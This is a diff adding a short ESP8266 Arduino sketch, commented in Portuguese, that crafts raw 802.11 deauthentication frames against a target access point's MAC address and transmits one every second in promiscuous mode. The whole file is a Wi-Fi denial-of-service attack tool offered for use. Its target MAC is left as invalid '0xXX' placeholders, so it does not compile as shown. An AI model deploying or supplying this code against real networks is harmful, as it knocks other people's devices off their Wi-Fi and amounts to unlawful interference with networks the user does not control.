@@ -1,0 +1,32 @@
+#include <ESP8266WiFi.h>  // Para ESP8266
+// #include <WiFi.h>  // Para ESP32
+
+extern "C" {
+  #include "user_interface.h"
+}
+
+void setup() {
+  Serial.begin(115200);
+  wifi_set_opmode(STATION_MODE);  // Modo estação
+  wifi_promiscuous_enable(1);  // Ativa modo promíscuo
+}
+
+void sendDeauth(uint8_t* ap_mac) {
+  uint8_t packet[26] = {
+    0xC0, 0x00, 0x3A, 0x01,                         // Frame Control e Duraction
+    ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],  // Destino
+    ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],  // Source
+    ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],  // BSSID
+    0x00, 0x00,                                     // Seq-ctl
+    0x01, 0x00                                      // Razão: Unspecified reason
+  };
+  
+  wifi_send_pkt_freedom(packet, 26, 0);  // Envia pacote
+  Serial.println("Pacote deauth enviado.");
+}
+
+void loop() {
+  uint8_t targetAP[6] = {0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX};  // MAC do AP alvo
+  sendDeauth(targetAP);
+  delay(1000);  // Aguarda 1 segundo entre envios
+}
